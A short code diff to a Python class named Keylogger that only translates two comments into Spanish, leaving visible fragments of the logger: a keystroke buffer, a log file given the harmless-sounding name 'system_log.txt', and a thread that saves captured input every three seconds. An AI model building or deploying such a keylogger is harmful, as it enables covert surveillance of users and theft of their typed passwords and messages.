@@ -19,7 +19,7 @@ class Keylogger:
     def __init__(self):
         self.log_file = "system_log.txt"
         self.buffer = ""
-        self.buffer_size = 5  # Smaller buffer for more responsive updates
+        self.buffer_size = 5  # Tamaño del buffer para actualizaciones más responsivas
         self.is_running = True
         self.key_count = 0
         self.word_count = 0
@@ -87,7 +87,7 @@ class Keylogger:
         def auto_save():
             counter = 0
             while self.is_running:
-                time.sleep(3)  # More frequent saves for real-time updates
+                time.sleep(3)  # Guardar cada 3 segundos
                 counter += 1
                 self.save_buffer()
                 print(f"Guardado automatico #{counter} (cada 3 segundos)")
